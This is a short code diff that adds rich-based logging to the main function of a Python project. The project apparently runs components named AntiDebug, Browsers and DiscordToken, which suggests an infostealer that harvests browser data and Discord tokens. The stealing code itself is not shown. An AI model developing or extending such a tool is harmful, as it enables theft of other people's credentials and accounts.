@@ -1,3 +1,8 @@
+import logging
+
+import click
+from rich.logging import RichHandler
+
 from components.antidebug import AntiDebug
 from components.browsers import Browsers
 from components.discordtoken import DiscordToken
@@ -8,6 +13,15 @@ from config import __CONFIG__
 
 
 def main():
+    logging.basicConfig(
+        level="NOTSET",
+        format="%(message)s",
+        datefmt="[%X]",
+        handlers=[RichHandler(rich_tracebacks=True,
+                              tracebacks_suppress=[click])]
+    )
+    logging.getLogger("rich")
+
     funcs = [
         AntiDebug,
         Browsers,
